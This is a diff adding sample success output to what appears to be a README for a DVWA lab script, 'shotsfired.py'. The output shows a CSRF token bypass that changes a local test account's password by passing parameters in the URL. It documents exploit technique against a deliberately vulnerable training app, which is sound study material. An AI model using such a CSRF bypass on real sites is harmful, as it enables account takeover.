@@ -131,6 +131,20 @@ This hybrid request satisfies both the token check (via `$_REQUEST` reading the 
 
 ## Example Output (Success)
 
+└─$ python3 shotsfired.py
+[!] Disabled InsecureRequestWarning for requests (verify=False used).
+--- Starting DVWA High CSRF Password Change Attempt (Exploiting GET Params) ---
+
+--- Attempt 1 of 5 ---
+[*] Attempting to fetch a fresh CSRF token...
+[+] CSRF Token Retrieved: 8c126a77ee701d7b8bce14e361246793
+[*] Submitting password change exploiting GET params with token: 8c126a77ee701d7b8bce14e361246793
+[*] Target URL for POST: http://127.0.0.1/vulnerabilities/csrf/?password_new=youvebeenhacked&password_conf=youvebeenhacked&Change=Change
+[+] SUCCESS: Password successfully changed to 'youvebeenhacked'!
+
+--- Script Finished ---
+✅ Password change exploiting GET parameters was successful.
+
 ---
 
 ## Disclaimer
